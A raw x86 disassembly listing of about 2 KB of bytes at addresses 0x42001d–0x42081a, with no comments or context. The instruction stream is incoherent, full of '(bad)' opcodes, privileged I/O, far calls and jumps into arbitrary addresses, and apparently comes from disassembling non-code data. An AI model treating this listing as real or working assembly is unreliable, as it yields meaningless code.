  42001d:	lods   eax,DWORD PTR ds:[esi]
  42001e:	icebp  
  42001f:	hlt    
  420020:	or     ecx,ebx
  420022:	sub    eax,edx
  420024:	loop   0x420045
  420026:	iret   
  420027:	scas   al,BYTE PTR es:[edi]
  420028:	xor    BYTE PTR [eax+0x747e8564],bl
  42002e:	xor    al,0x44
  420030:	add    ecx,DWORD PTR ds:0xea57b55f
  420036:	push   eax
  420037:	inc    esp
  420038:	aam    0xe0
  42003a:	lods   al,BYTE PTR ds:[esi]
  42003b:	cs dec edx
  42003d:	and    BYTE PTR [esp+eax*4+0x5be35ee7],al
  420044:	fnstenv [ebx]
  420046:	xor    dl,BYTE PTR [eax-0x1b1d8665]
  42004c:	jb     0x41ffec
  42004e:	loop   0x420095
  420050:	push   0x20
  420052:	imul   esp,ebx,0xffffffcd
  420055:	sbb    DWORD PTR [eax+0x25294449],esi
  42005b:	adc    eax,0x94b830cc
  420060:	cmp    bl,ah
  420062:	ret    0x99a0
  420065:	js     0x41fff4
  420067:	std    
  420068:	imul   DWORD PTR [eax+0x4ee5eb29]
  42006e:	lods   eax,DWORD PTR ds:[esi]
  42006f:	std    
  420070:	and    DWORD PTR [edx+0x2f],eax
  420073:	sub    DWORD PTR [ebp+edx*2-0x5d],ebp
  420077:	cmp    cl,ch
  420079:	sub    al,BYTE PTR [ecx-0x4e]
  42007c:	idiv   BYTE PTR [ebp+0x10]
  42007f:	mov    ss,ebx
  420081:	add    eax,0xdeb40afa
  420086:	leave  
  420087:	push   esi
  420088:	xchg   ecx,eax
  420089:	pop    ecx
  42008a:	and    eax,0x47fac142
  42008f:	stos   BYTE PTR es:[edi],al
  420090:	sub    bh,dl
  420092:	sub    ebp,DWORD PTR [ecx+0x6e]
  420095:	and    eax,0xcfc8f307
  42009a:	test   DWORD PTR es:[eax+esi*8-0x32],edx
  42009f:	and    dh,cl
  4200a1:	jle    0x4200c6
  4200a3:	ret    
  4200a4:	ds push esp
  4200a6:	std    
  4200a7:	jae    0x42011a
  4200a9:	loopne 0x42003f
  4200ab:	dec    BYTE PTR ss:[eax]
  4200ae:	addr16 int 0x89
  4200b1:	nop
  4200b2:	xchg   ebp,eax
  4200b3:	sbb    dh,BYTE PTR [ecx]
  4200b5:	clc    
  4200b6:	inc    edi
  4200b7:	push   ebx
  4200b8:	dec    edx
  4200b9:	in     al,0xa7
  4200bb:	in     al,0x34
  4200bd:	int3   
  4200be:	int    0x84
  4200c0:	xchg   DWORD PTR [ebp+0x46],ebx
  4200c3:	jge    0x42004c
  4200c5:	mov    ch,0xc7
  4200c7:	mov    ch,0x75
  4200c9:	jmp    esi
  4200cb:	mov    al,0x50
  4200cd:	inc    ecx
  4200ce:	mov    BYTE PTR [edx],dh
  4200d0:	push   ebx
  4200d1:	out    0xb4,eax
  4200d3:	fisub  WORD PTR [edi-0x5af24282]
  4200d9:	mov    dh,0x3f
  4200db:	fistp  WORD PTR [ebp+0x4c]
  4200de:	dec    ecx
  4200df:	iret   
  4200e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200e1:	lea    ebx,[ebx-0x21a88f60]
  4200e7:	es mov bl,0xa
  4200ea:	xchg   DWORD PTR [edx+0x7a0a4847],ecx
  4200f0:	mov    ds:0x25371eb4,al
  4200f5:	add    ah,al
  4200f7:	imul   ebp,DWORD PTR [edi+0x625fcaee],0x3e0bfd4e
  420101:	in     al,dx
  420102:	xchg   edi,eax
  420103:	xchg   edi,eax
  420104:	cmp    ecx,eax
  420106:	push   ebx
  420107:	or     al,0xc9
  420109:	les    edx,FWORD PTR [ebp-0x4ebb5fbd]
  42010f:	repz aad 0x22
  420112:	inc    eax
  420113:	sbb    eax,0x5d23b3ab
  420118:	add    DWORD PTR [esi+0x670a7725],esp
  42011e:	or     eax,edi
  420120:	mov    ch,0x42
  420122:	loope  0x42012e
  420124:	mov    ds:0xd10da6c6,eax
  420129:	xor    BYTE PTR [edx-0x57ee2dcb],ch
  42012f:	and    ch,BYTE PTR [ebx]
  420131:	mov    ds:0xde23dd89,eax
  420137:	sbb    BYTE PTR [esi-0x42],al
  42013a:	mov    esp,0xc579ca9f
  42013f:	pop    edx
  420140:	add    al,ah
  420142:	cmp    ecx,esi
  420144:	push   0x42fd1699
  420149:	mov    bl,0x59
  42014b:	and    BYTE PTR [ecx],ah
  42014d:	rol    BYTE PTR [ebx],0x29
  420150:	test   eax,0x4a26c3ee
  420155:	daa    
  420156:	push   esi
  420157:	cwde   
  420158:	pop    esp
  420159:	or     bp,bx
  42015c:	(bad)  
  42015d:	adc    BYTE PTR [ebp+0x41819336],ch
  420163:	repnz idiv DWORD PTR [edx+ecx*1-0x24908c98]
  42016b:	fstp   TBYTE PTR [ebx+0x3b]
  42016e:	clc    
  42016f:	pop    ebx
  420170:	scas   al,BYTE PTR es:[edi]
  420171:	stos   DWORD PTR es:[edi],eax
  420172:	sbb    DWORD PTR ds:0x19f4c1,ecx
  420178:	jbe    0x4201b8
  42017a:	call   0xaccabf1c
  42017f:	add    al,0x60
  420181:	or     ah,BYTE PTR [ebx+edi*2+0x9]
  420185:	adc    ecx,edx
  420187:	jle    0x4201d9
  420189:	jb     0x4201a8
  42018b:	mov    al,0x43
  42018d:	push   eax
  42018e:	leave  
  42018f:	cs dec ebx
  420191:	and    dh,BYTE PTR [esi+0x34260ca8]
  420197:	(bad)  
  420198:	fcom   QWORD PTR [ebx-0x52e09e96]
  42019e:	jmp    0x42018d
  4201a0:	outs   dx,DWORD PTR ds:[esi]
  4201a1:	stos   DWORD PTR es:[edi],eax
  4201a2:	xor    BYTE PTR [eax],ah
  4201a4:	xchg   cl,cl
  4201a6:	mov    ch,0x1f
  4201a8:	and    al,0xee
  4201aa:	dec    edx
  4201ab:	sub    eax,0x8cbff696
  4201b0:	mov    ds:0xdff9a5e5,al
  4201b5:	sub    dl,dh
  4201b7:	cmp    ebp,ecx
  4201b9:	shl    DWORD PTR [edi+0x2825465c],1
  4201bf:	lds    edi,FWORD PTR [edx]
  4201c1:	push   eax
  4201c2:	gs out dx,eax
  4201c4:	xchg   DWORD PTR [ecx],eax
  4201c6:	and    DWORD PTR [ebp+edi*2+0x2a],ecx
  4201ca:	jno    0x42014f
  4201cc:	test   bh,al
  4201ce:	sbb    eax,0x71c4e8a4
  4201d3:	or     DWORD PTR es:[edi],ebx
  4201d6:	pop    ecx
  4201d7:	jae    0x420236
  4201d9:	out    0x2c,eax
  4201db:	cmp    edi,DWORD PTR ds:0x2bd68ae4
  4201e1:	les    edi,FWORD PTR [ebp+0x75]
  4201e4:	jmp    0x6aaf57c9
  4201e9:	pop    ss
  4201ea:	and    DWORD PTR [edx+esi*4+0x2aefabc0],esi
  4201f1:	fdiv   QWORD PTR [edi]
  4201f3:	mov    ds,ebx
  4201f5:	xchg   esi,eax
  4201f6:	push   ecx
  4201f7:	call   0x3ae2:0x887d2437
  4201fe:	inc    esp
  4201ff:	mov    ecx,0x3b00ce97
  420204:	add    DWORD PTR ds:0x3ded231b,eax
  42020a:	lea    ecx,[esi+0x45]
  42020d:	mov    bl,cl
  42020f:	fdivr  QWORD PTR [ebp-0x2a]
  420212:	in     eax,0x80
  420214:	pushf  
  420215:	adc    dh,BYTE PTR [ebx+0x7e]
  420218:	pushf  
  420219:	mov    ds:0x2bb1a032,eax
  42021e:	hlt    
  42021f:	cld    
  420220:	(bad)  
  420221:	sbb    edx,DWORD PTR [edi-0x68655c95]
  420227:	pop    esp
  420228:	je     0x4201b8
  42022a:	adc    DWORD PTR [esi+0x4edbe684],esi
  420230:	in     al,0x8b
  420232:	scas   eax,DWORD PTR es:[edi]
  420233:	mov    eax,0xccfa9957
  420238:	int3   
  420239:	in     al,dx
  42023a:	je     0x4202a4
  42023c:	jmp    0x420219
  42023e:	cld    
  42023f:	and    BYTE PTR [ebp-0x5],bl
  420242:	clc    
  420243:	cmp    eax,0x636abbbf
  420248:	lock sbb DWORD PTR [eax+0x6f2adaf6],esp
  42024f:	push   ebx
  420250:	fcomp  DWORD PTR [ebp+0x32]
  420253:	shl    DWORD PTR [eax+0x49241ccd],0x81
  42025a:	and    bh,BYTE PTR [eax+0x3b]
  42025d:	jo     0x4202b4
  42025f:	out    dx,al
  420260:	or     al,0xbe
  420262:	lds    esp,FWORD PTR [esi+0xdf7d66d]
  420268:	jp     0x420231
  42026a:	pop    esp
  42026b:	dec    ebx
  42026c:	or     DWORD PTR [esi+ecx*8],ebp
  42026f:	pushf  
  420270:	sub    al,0x8c
  420272:	jmp    DWORD PTR [esi-0x41]
  420275:	or     eax,0x722e4dc1
  42027a:	or     al,0x88
  42027c:	into   
  42027d:	mov    ds:0xf208dae4,eax
  420282:	jb     0x4202c6
  420284:	loop   0x4202df
  420286:	sbb    BYTE PTR [eax-0x413823b1],0xd1
  42028d:	enter  0x7c66,0xc8
  420291:	mov    ch,0x37
  420293:	add    esp,DWORD PTR [edi-0x2b7c478f]
  420299:	cmp    ebp,DWORD PTR [esi-0x4ec1d374]
  42029f:	cwde   
  4202a0:	xor    eax,0x536f900
  4202a5:	sbb    ebp,eax
  4202a7:	mov    dh,0xa4
  4202a9:	inc    ecx
  4202aa:	jns    0x4202d6
  4202ac:	mov    edi,0xe7bb79fc
  4202b1:	sbb    eax,0xef4225b6
  4202b6:	adc    edi,ecx
  4202b8:	fcom   DWORD PTR [edi+0x6e0e1114]
  4202be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4202bf:	outs   dx,DWORD PTR ds:[esi]
  4202c0:	cmc    
  4202c1:	ret    0x7554
  4202c4:	into   
  4202c5:	mov    bh,0x32
  4202c7:	mov    cl,0xed
  4202c9:	and    eax,DWORD PTR [esi]
  4202cb:	mov    DWORD PTR [ebp-0x2b52e088],edi
  4202d1:	xchg   ebx,eax
  4202d2:	jecxz  0x42033b
  4202d4:	jge    0x420320
  4202d6:	fisub  DWORD PTR [ecx]
  4202d8:	fstp   TBYTE PTR [esi-0x5f2c535d]
  4202de:	mov    al,ds:0xe71cab0
  4202e3:	or     BYTE PTR [eax+ebx*4-0x178d6a14],bh
  4202ea:	rol    ah,1
  4202ec:	mov    ds:0xa2692764,eax
  4202f1:	popf   
  4202f2:	je     0x4202ec
  4202f4:	test   eax,0x8b97ae5
  4202f9:	mov    ds:0x7426aba,eax
  4202fe:	inc    ebx
  4202ff:	pmulhw mm5,QWORD PTR ds:0xa46353b7
  420306:	add    al,0xec
  420308:	sbb    ecx,ecx
  42030a:	sub    eax,0x5c8640e7
  42030f:	int3   
  420310:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  420312:	dec    ebp
  420313:	arpl   WORD PTR [esi+0x54886560],cx
  420319:	mov    al,ds:0xccb68a0e
  42031e:	push   cs
  42031f:	inc    edx
  420320:	bound  esp,QWORD PTR [edx]
  420322:	loop   0x420350
  420324:	cmp    eax,DWORD PTR [ebp+0x2d]
  420327:	jb     0x420365
  420329:	jns    0x42033a
  42032b:	mov    dh,0xe9
  42032d:	sub    esi,DWORD PTR [ecx+eiz*2+0x18]
  420331:	enter  0x1873,0xa6
  420335:	xor    BYTE PTR [ecx],dh
  420337:	mov    eax,0x6704dd71
  42033c:	or     eax,0xd748f0db
  420341:	mov    edi,fs
  420343:	and    DWORD PTR [ebx],eax
  420345:	imul   esi,DWORD PTR [eax-0x49],0x7f
  420349:	add    al,0xd8
  42034b:	fbld   TBYTE PTR [ebp+edi*8-0x4355f1db]
  420352:	fist   WORD PTR [eiz*4-0x55aa5064]
  420359:	imul   BYTE PTR [ebx+0x21]
  42035c:	mov    bl,0xdc
  42035e:	(bad)  
  42035f:	push   esp
  420360:	mov    ebx,0xa606820a
  420365:	daa    
  420366:	mov    edx,0x9e6bd72b
  42036b:	sbb    dl,0x91
  42036e:	(bad)  
  42036f:	shl    BYTE PTR [esi+edi*8+0x79],0xee
  420374:	sbb    dh,ch
  420376:	repz ret 0xb0d8
  42037a:	(bad)  
  42037b:	jle    0x4203d0
  42037d:	or     ecx,DWORD PTR [eax-0x6f332087]
  420383:	retf   
  420384:	adc    al,0xfe
  420386:	das    
  420387:	ds call 0x33b30cc1
  42038d:	adc    DWORD PTR [ebp-0x5a770fb5],0xffffff83
  420394:	inc    ebp
  420395:	scas   eax,DWORD PTR es:[edi]
  420396:	repnz sbb eax,edi
  420399:	in     eax,dx
  42039a:	push   eax
  42039b:	and    al,BYTE PTR [ebp+0x4703c862]
  4203a1:	xchg   edi,eax
  4203a2:	call   0xc717:0x3a5e0c68
  4203a9:	dec    edx
  4203aa:	inc    esp
  4203ab:	mov    ebx,0xef2d55fe
  4203b0:	loop   0x420391
  4203b2:	mov    ecx,0x9d272e96
  4203b7:	mov    dl,dl
  4203b9:	out    0xd,eax
  4203bb:	sbb    bh,BYTE PTR [ebp+0x53d4e925]
  4203c1:	stc    
  4203c2:	or     DWORD PTR [ebp+0x479c239],0xffffff8e
  4203c9:	jb     0x42038a
  4203cb:	cs mov ebx,0x661b84b5
  4203d1:	sbb    eax,0x3e586519
  4203d6:	xchg   DWORD PTR [ebx-0x6c],esi
  4203d9:	in     eax,0x5c
  4203db:	sbb    al,al
  4203dd:	mov    edi,0x8a699e74
  4203e2:	xchg   esp,eax
  4203e3:	dec    edx
  4203e4:	and    DWORD PTR [ecx-0x24e3f24c],edx
  4203ea:	int3   
  4203eb:	jp     0x420401
  4203ed:	fnstenv [ebx+0x48]
  4203f0:	call   0x3c31:0xda069067
  4203f7:	or     ebx,DWORD PTR [edx]
  4203f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203fa:	mov    cl,0x29
  4203fc:	sub    al,0x4d
  4203fe:	xchg   edx,eax
  4203ff:	push   0xffffff8f
  420401:	mov    esi,0xe6edeaa4
  420406:	dec    ecx
  420407:	fwait
  420408:	imul   BYTE PTR [edi+0x36e05f91]
  42040e:	pop    ecx
  42040f:	aam    0x66
  420411:	lds    esi,FWORD PTR [ebx]
  420413:	imul   edx,esp,0xfffffff8
  420416:	pop    ss
  420417:	test   esp,ebp
  420419:	setl   ch
  42041c:	pusha  
  42041d:	lahf   
  42041e:	fdiv   DWORD PTR [ebp+0x67]
  420421:	stos   BYTE PTR es:[edi],al
  420422:	dec    ecx
  420423:	clc    
  420424:	arpl   WORD PTR [eax-0x6e2650d2],cx
  42042a:	mov    al,ds:0x2344d730
  42042f:	jp     0x42040d
  420431:	popf   
  420432:	or     ebx,DWORD PTR [edi+eax*8]
  420435:	(bad)  
  420436:	push   ebp
  420437:	icebp  
  420438:	pusha  
  420439:	rcr    DWORD PTR [edi-0xcb938ed],1
  42043f:	or     eax,0x35de0c3e
  420444:	fdivr  QWORD PTR [ebx-0x7e]
  420447:	(bad)  
  420448:	xchg   ebx,eax
  420449:	fwait
  42044a:	ins    BYTE PTR es:[edi],dx
  42044b:	push   0x1e
  42044d:	mov    BYTE PTR [eax+0x22],dh
  420450:	repnz adc esi,DWORD PTR [ebp+0x63c3b4d1]
  420457:	push   ds
  420458:	lea    esi,[ebp+ecx*1-0x75]
  42045c:	xchg   edi,eax
  42045d:	retf   0x224c
  420460:	sub    BYTE PTR [ebp+0x7fd495b7],bl
  420466:	(bad)  
  420467:	into   
  420468:	out    dx,eax
  420469:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42046a:	jae    0x42048f
  42046c:	jmp    0x4204a7
  42046e:	dec    esi
  42046f:	mov    bl,0x23
  420471:	mov    BYTE PTR [edi],ch
  420473:	lock out dx,al
  420475:	jmp    0x3de95bd2
  42047a:	in     eax,0xdc
  42047c:	pop    ecx
  42047d:	call   0x93a5:0xc49038ac
  420484:	xor    ah,BYTE PTR [esi]
  420486:	lea    ebx,[ecx+0x43]
  420489:	das    
  42048a:	xor    BYTE PTR [ebx+0x78944186],dh
  420490:	mov    bl,0xbc
  420492:	scas   eax,DWORD PTR es:[edi]
  420493:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420494:	out    dx,eax
  420495:	sub    DWORD PTR [edx],esp
  420497:	popf   
  420498:	cmp    bh,BYTE PTR [ebp-0x57]
  42049b:	out    0xfc,eax
  42049d:	jo     0x42044f
  42049f:	popa   
  4204a0:	div    BYTE PTR [ebp-0x23]
  4204a3:	xor    ah,BYTE PTR ds:0xaf9a780d
  4204a9:	(bad)  
  4204aa:	lock shl BYTE PTR [edx-0x5dceb5e],0xc0
  4204b2:	xor    al,0x73
  4204b4:	push   edx
  4204b5:	or     dh,cl
  4204b7:	in     eax,0x7c
  4204b9:	dec    edx
  4204ba:	and    BYTE PTR ds:0x8c834944,dh
  4204c0:	mov    esp,eax
  4204c2:	or     al,0xd4
  4204c4:	leave  
  4204c5:	jnp    0x4204ea
  4204c7:	or     bh,BYTE PTR [ecx-0x2f]
  4204ca:	ror    DWORD PTR [esi-0x4a],1
  4204cd:	dec    edx
  4204ce:	sub    eax,0x5a3ee20e
  4204d3:	pushf  
  4204d4:	bound  eax,QWORD PTR [edi-0xb]
  4204d7:	inc    edi
  4204d8:	daa    
  4204d9:	lods   al,BYTE PTR ds:[esi]
  4204da:	and    BYTE PTR cs:[ebx+0x4824fac5],dh
  4204e1:	outs   dx,DWORD PTR ds:[esi]
  4204e2:	ins    DWORD PTR es:[edi],dx
  4204e3:	loop   0x420468
  4204e5:	rol    BYTE PTR [eax],1
  4204e7:	enter  0xa59c,0x93
  4204eb:	out    0x30,eax
  4204ed:	inc    eax
  4204ee:	jo     0x420531
  4204f0:	xlat   BYTE PTR ds:[ebx]
  4204f1:	mov    al,0xf6
  4204f3:	sbb    ah,BYTE PTR [esi+edx*1+0x54]
  4204f7:	jmp    0x4204fd
  4204f9:	dec    ebx
  4204fa:	push   ss
  4204fb:	lods   eax,DWORD PTR es:[esi]
  4204fd:	sar    esp,0x6
  420500:	call   0xefa783ba
  420505:	and    BYTE PTR [edi-0x17044761],dh
  42050b:	retf   
  42050c:	inc    ebp
  42050d:	jecxz  0x420541
  42050f:	sbb    edx,DWORD PTR [esi-0x1e]
  420512:	enter  0xa7b2,0x32
  420516:	call   0xbc4d:0xc1b8248e
  42051d:	imul   ebx,ebp,0xffffffe4
  420520:	fst    st(5)
  420522:	mov    eax,ds:0x2ef0a767
  420527:	lock jo 0x420545
  42052a:	mov    ch,0xba
  42052c:	imul   esi,ebp,0x5389d950
  420532:	ret    0x120e
  420535:	ins    DWORD PTR es:[edi],dx
  420536:	pop    ebx
  420537:	mov    ebp,0xfbe546ed
  42053c:	ret    
  42053d:	adc    BYTE PTR [esi],al
  42053f:	retf   
  420540:	sar    esi,1
  420542:	push   edi
  420543:	or     al,0x4b
  420545:	imul   edx,DWORD PTR [edi-0x5b],0x8a3e1f12
  42054c:	repz or ebp,DWORD PTR [ebp-0x53]
  420550:	out    dx,al
  420551:	jge    0x4205bc
  420553:	mov    ?,edi
  420555:	push   es
  420556:	mov    bl,0x89
  420558:	nop
  420559:	xchg   ebx,eax
  42055a:	jmp    0x8fdfa0b6
  42055f:	cs xchg edx,eax
  420561:	(bad)  
  420563:	retf   0xf400
  420566:	adc    al,0x46
  420568:	leave  
  420569:	cld    
  42056a:	jp     0x4205b6
  42056c:	adc    al,0x53
  42056f:	enter  0x7e4c,0xa2
  420573:	test   DWORD PTR [ebx-0x38],edi
  420576:	mov    dh,0x36
  420578:	mov    eax,ds:0xb342af06
  42057d:	sbb    DWORD PTR [ebp+0x31],ecx
  420580:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420581:	cmp    ebx,0x8853c57f
  420587:	icebp  
  420588:	out    dx,al
  420589:	js     0x420513
  42058b:	or     esp,DWORD PTR [edi]
  42058d:	repz xlat BYTE PTR ds:[ebx]
  42058f:	or     al,0xe8
  420591:	jg     0x420527
  420593:	mov    edi,DWORD PTR [esi-0x5a]
  420596:	sbb    ah,dl
  420598:	and    al,0x34
  42059a:	add    ebx,DWORD PTR [edx+0x21]
  42059d:	add    DWORD PTR ds:0x2118cbeb,ebp
  4205a3:	out    dx,al
  4205a4:	dec    esi
  4205a5:	mov    eax,ds:0xd7e60d59
  4205aa:	jp     0x42059e
  4205ac:	xchg   edi,eax
  4205ad:	lods   eax,DWORD PTR ds:[esi]
  4205ae:	inc    ebp
  4205af:	and    al,0x84
  4205b1:	or     BYTE PTR [edi+0x46],dh
  4205b4:	cmp    ah,dl
  4205b6:	add    edx,eax
  4205b8:	xor    DWORD PTR [ecx-0x2ea6bcf3],esp
  4205be:	into   
  4205bf:	inc    esp
  4205c0:	sub    ebx,ebx
  4205c2:	sub    BYTE PTR [eax+esi*2+0x15e4f58d],bl
  4205c9:	xchg   DWORD PTR [ebx+ebx*4],ebx
  4205cc:	and    eax,0xea374709
  4205d1:	js     0x42056c
  4205d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205d4:	jp     0x4205f5
  4205d6:	mov    cs,WORD PTR [eax+0x4645b485]
  4205dc:	inc    ebp
  4205dd:	xchg   ebp,eax
  4205de:	out    dx,al
  4205df:	not    DWORD PTR [eax+0x71]
  4205e2:	inc    ebx
  4205e3:	xor    al,0x57
  4205e5:	enter  0x2eb,0x12
  4205e9:	or     dh,BYTE PTR [esi-0x7ac862b7]
  4205ef:	mov    bh,0xed
  4205f1:	fidiv  DWORD PTR [edx]
  4205f3:	jb     0x420665
  4205f5:	push   esp
  4205f6:	xor    al,0xeb
  4205f8:	mov    eax,0x154f37cf
  4205fd:	push   edi
  4205fe:	jb     0x420632
  420600:	jno    0x420664
  420602:	cmp    dh,ah
  420604:	popa   
  420605:	mul    DWORD PTR [edx+0x5f]
  420608:	xchg   edi,eax
  420609:	jbe    0x42062e
  42060b:	or     eax,0xcf9cafc8
  420610:	jns    0x4205db
  420612:	pop    eax
  420613:	scas   al,BYTE PTR es:[edi]
  420614:	pop    es
  420615:	sbb    ebp,ecx
  420617:	dec    edx
  420618:	(bad)  
  420619:	lods   al,BYTE PTR ds:[esi]
  42061a:	mov    cl,0xf9
  42061c:	jb     0x420667
  42061e:	add    ebp,esi
  420620:	loopne 0x4205b9
  420622:	mov    DWORD PTR [ebp+0x1b2833f3],esi
  420628:	mov    fs,eax
  42062a:	sub    ecx,DWORD PTR ds:[eax+ebp*4-0xd]
  42062f:	or     al,0xb4
  420631:	shl    DWORD PTR [ebp-0x20cbaf84],1
  420637:	sbb    ah,dh
  420639:	adc    DWORD PTR [ebx+0x3f],ebx
  42063c:	call   0x27140507
  420641:	xchg   ecx,eax
  420642:	lods   eax,DWORD PTR ds:[esi]
  420643:	cld    
  420644:	bound  eax,QWORD PTR [edi+ebp*4+0x26]
  420648:	add    BYTE PTR [edx+0x75],ch
  42064b:	mov    eax,0xa01a9580
  420650:	jmp    0x33c8e91a
  420655:	xor    DWORD PTR [ecx],edx
  420657:	mov    al,ch
  420659:	ds repnz fdivrp st(4),st
  42065d:	data16 in al,0x12
  420660:	xlat   BYTE PTR ds:[ebx]
  420661:	inc    ebp
  420662:	mov    bl,0x36
  420664:	out    0xdd,eax
  420666:	int3   
  420667:	test   BYTE PTR [eax+esi*2],bh
  42066a:	into   
  42066b:	mov    ecx,DWORD PTR [esi]
  42066d:	mov    al,0xb
  42066f:	bound  esp,QWORD PTR [esi*2+0x12cc7f88]
  420676:	xor    eax,0x22ca4e6
  42067b:	xchg   ebx,eax
  42067c:	inc    edx
  42067d:	dec    ebp
  42067e:	mov    edi,0xd6bba1ed
  420683:	sub    eax,0xad01d1ab
  420688:	das    
  420689:	add    eax,0x7670d201
  42068e:	add    al,0xe4
  420690:	mov    ecx,0xb396e350
  420695:	mov    eax,0x669b27fc
  42069a:	jbe    0x420688
  42069c:	not    bl
  42069e:	adc    eax,0x9577d8b4
  4206a3:	lahf   
  4206a4:	je     0x4206c4
  4206a6:	jne    0x420725
  4206a8:	mov    dl,dh
  4206aa:	sbb    BYTE PTR [edi],0x11
  4206ad:	sub    al,0xfe
  4206af:	hlt    
  4206b0:	outs   dx,BYTE PTR ds:[esi]
  4206b1:	jno    0x420689
  4206b3:	sub    DWORD PTR [esi+edx*4],edi
  4206b6:	fisubr DWORD PTR [edx+0x235f7551]
  4206bc:	adc    esp,DWORD PTR [edi+0x6fa73501]
  4206c2:	mov    ecx,0x12248391
  4206c7:	push   edx
  4206c8:	test   cl,bl
  4206ca:	inc    ebx
  4206cb:	(bad)  
  4206cc:	idiv   BYTE PTR [esp+edx*4]
  4206cf:	dec    edi
  4206d0:	inc    ebp
  4206d1:	test   eax,0x4beb1e72
  4206d6:	cmc    
  4206d7:	cmp    esi,0xffffff89
  4206da:	adc    dl,ah
  4206dc:	push   eax
  4206dd:	retf   
  4206de:	mov    bh,bh
  4206e0:	into   
  4206e1:	or     BYTE PTR [esi],ch
  4206e3:	jns    0x4206e0
  4206e5:	rol    BYTE PTR [ebp+eax*4-0x25],1
  4206e9:	lods   eax,DWORD PTR ds:[esi]
  4206ea:	int3   
  4206eb:	and    al,bl
  4206ed:	mov    cl,0xac
  4206ef:	sti    
  4206f0:	push   ebp
  4206f1:	stos   DWORD PTR es:[edi],eax
  4206f2:	dec    edx
  4206f3:	push   cs
  4206f4:	sbb    edi,DWORD PTR [eax-0x7080ee26]
  4206fa:	xchg   edi,eax
  4206fb:	adc    eax,0x4938f042
  420700:	xor    al,0xf7
  420702:	sub    dh,BYTE PTR [ebp+0x28]
  420705:	(bad)  
  420706:	hlt    
  420707:	adc    DWORD PTR [eax-0x7cd2c521],esp
  42070d:	sub    eax,0xb885d23d
  420712:	pop    ebp
  420713:	mov    dl,0x31
  420715:	lods   al,BYTE PTR ds:[esi]
  420716:	jl     0x420754
  420718:	aam    0xf9
  42071a:	cdq    
  42071b:	clc    
  42071c:	mov    al,ds:0x56cbdddc
  420721:	and    BYTE PTR [eax-0x41],dl
  420724:	dec    edx
  420725:	cwde   
  420726:	xchg   esi,eax
  420727:	stos   DWORD PTR es:[edi],eax
  420728:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420729:	mov    edi,DWORD PTR [ecx]
  42072b:	jle    0x4206c4
  42072d:	mov    dl,0x3e
  42072f:	xchg   ebp,eax
  420730:	mov    al,ds:0xfb804b5b
  420735:	loop   0x42071e
  420737:	das    
  420738:	cmp    cl,BYTE PTR [edx]
  42073a:	out    0xf7,al
  42073c:	push   ds
  42073d:	data16 out dx,al
  42073f:	(bad)  
  420741:	push   ebx
  420742:	adc    bh,BYTE PTR [ebx]
  420744:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  420746:	xchg   edi,eax
  420747:	mov    dl,0x39
  420749:	inc    ebp
  42074a:	add    DWORD PTR [ebp+0x7d],eax
  42074d:	and    BYTE PTR [edx],ch
  42074f:	aam    0x6e
  420751:	pop    esi
  420752:	cmp    ah,dh
  420754:	mov    BYTE PTR [ecx],0x73
  420757:	shl    DWORD PTR [edx+0x26],1
  42075a:	lea    edx,[ebx-0xc]
  42075d:	push   esp
  42075e:	daa    
  42075f:	add    eax,0x7229422b
  420764:	addr16 push es
  420766:	test   DWORD PTR [ebp+0x5494db6e],0xe0067bff
  420770:	ds (bad) 
  420772:	cld    
  420773:	mov    edx,0x21b733fe
  420778:	mov    eax,ds:0xb99dd31a
  42077d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42077e:	loope  0x420794
  420780:	push   ds
  420781:	fidiv  DWORD PTR [ecx]
  420783:	sbb    BYTE PTR [eax],0x9
  420786:	mov    al,ds:0x3cd1214f
  42078b:	out    dx,al
  42078c:	cld    
  42078d:	nop
  42078e:	push   eax
  42078f:	cmp    eax,0x25d4cab7
  420794:	pop    ebx
  420795:	xchg   edx,eax
  420796:	scas   al,BYTE PTR es:[edi]
  420797:	call   esi
  420799:	popf   
  42079a:	xchg   edx,eax
  42079b:	xor    ch,cl
  42079d:	daa    
  42079e:	hlt    
  42079f:	shl    DWORD PTR [eax+ebp*1-0x41],0x30
  4207a4:	ds jns 0x420819
  4207a7:	dec    eax
  4207a8:	ins    BYTE PTR es:[edi],dx
  4207a9:	adc    BYTE PTR [esi+0xe6dedd5],bl
  4207af:	shl    edi,0x6e
  4207b2:	int3   
  4207b3:	xor    DWORD PTR [esi],0xc1c3655a
  4207b9:	mov    edx,0x6e909f53
  4207be:	xor    DWORD PTR [esi+0x7e],esp
  4207c1:	mov    ?,WORD PTR [esp+edx*4-0x2b7165a2]
  4207c8:	imul   ebx,DWORD PTR [edx-0x1d],0xf55e739
  4207cf:	push   0xffffff87
  4207d1:	xor    BYTE PTR [ebx+edi*8+0x5ac2becd],bh
  4207d8:	stos   BYTE PTR es:[edi],al
  4207d9:	adc    DWORD PTR [ecx-0x39],edx
  4207dc:	hlt    
  4207dd:	xchg   cx,ax
  4207df:	jne    0x42085a
  4207e1:	and    DWORD PTR [esi+0x34],ebp
  4207e4:	ror    DWORD PTR [edx-0x80],1
  4207e7:	cs xor al,0x80
  4207ea:	ins    DWORD PTR es:[edi],dx
  4207eb:	sbb    bh,BYTE PTR [eax-0x2b24c156]
  4207f1:	fidiv  DWORD PTR [ecx]
  4207f3:	mov    ebp,0xf7490280
  4207f8:	lods   al,BYTE PTR ds:[esi]
  4207f9:	pop    ecx
  4207fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207fb:	add    dl,BYTE PTR [edx+0x1c]
  4207fe:	js     0x420855
  420800:	inc    si
  420802:	xchg   esi,eax
  420803:	cmp    DWORD PTR [eax-0xb16d25b],ebx
  420809:	mov    ecx,0xb2d2d061
  42080e:	aad    0x5d
  420810:	mov    DWORD PTR [edi+0x64],edx
  420813:	outs   dx,DWORD PTR ds:[esi]
  420814:	pop    edx
  420815:	(bad)  
  420816:	cli    
  420817:	or     BYTE PTR [ecx+0x6],dh
  42081a:	or     dl,BYTE PTR [esi+0x3d71d6b6]
